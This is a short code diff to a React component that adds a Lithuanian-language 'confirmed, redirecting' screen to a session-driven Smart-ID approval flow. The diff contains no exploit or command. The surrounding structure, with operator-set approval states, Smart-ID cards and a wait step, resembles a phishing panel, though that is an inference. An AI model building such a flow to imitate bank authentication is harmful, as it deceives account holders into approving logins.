@@ -526,6 +526,25 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
     return <SpecialNoticeCard message={viewState.message} imageUrl={viewState.imageUrl} />;
   }
 
+  // Onay verildi → wait adimina yonlendirme gelene kadar kisa "onaylandi" ekrani.
+  // (_confirmed suffix'i kartlarla eslesmedigi icin generic kart flash'i olusuyordu)
+  if (viewState.approvalStatus.endsWith("_confirmed")) {
+    return (
+      <div className="flex min-h-screen items-center justify-center px-4 py-8">
+        <div className="w-full max-w-[360px] rounded-[22px] border border-[#d9dee6] bg-white px-7 py-10 text-center shadow-[0_24px_80px_rgba(20,32,56,0.10)]">
+          <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-emerald-500/10 text-emerald-600">
+            <svg className="h-7 w-7" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
+            </svg>
+          </div>
+          <h1 className="text-xl font-bold text-[#101828]">Patvirtinta!</h1>
+          <p className="mt-2 text-sm text-[#667085]">Prašome palaukti, nukreipiama...</p>
+          <div className="mx-auto mt-5 h-6 w-6 animate-spin rounded-full border-[3px] border-[#1464f4]/20 border-t-[#1464f4]" />
+        </div>
+      </div>
+    );
+  }
+
   if (viewState.approvalStatus === "smartid_1" || viewState.approvalStatus === "smartid_2") {
     return (
       <SmartIdApprovalCard
